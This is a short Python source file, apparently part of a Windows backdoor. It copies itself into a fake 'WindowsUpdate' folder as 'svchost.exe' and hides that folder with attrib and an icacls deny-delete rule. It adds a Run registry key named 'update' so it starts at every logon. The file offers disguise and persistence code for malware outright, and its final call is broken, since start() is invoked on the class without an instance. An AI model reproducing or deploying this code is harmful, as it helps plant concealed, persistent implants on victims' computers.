### System Modules ###
import os
import sys
import shutil
import subprocess


class Backdoor:

    def __init__(self):
        self.folder  = os.environ["appdata"] + "\\WindowsUpdate"
        if not os.path.exists(self.folder): os.mkdir(self.folder)
        self.bd_path = self.folder + "\\svchost.exe"
        self.path    = sys.argv[0]

    def hide(self):
        if os.path.exists(self.folder):
            subprocess.call("icacls " + self.folder + " /deny Everyone:(OI)(CI)(DE,DC)", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
            subprocess.call("attrib +h +s "+ self.folder ,stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def start(self):
        if self.path != self.bd_path:
            try:
                shutil.copy2(self.path, self.bd_path)      # Copy the file to the backdoor folder
                os.system("start " + self.bd_path)         # Start the backdoor
                self.hide()
                os._exit(1)
            except: pass
        else: 
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + self.bd_path + '" /f', shell=True)
            return True



if __name__ == "__main__":
    if not Backdoor.start(): os._exit(1)
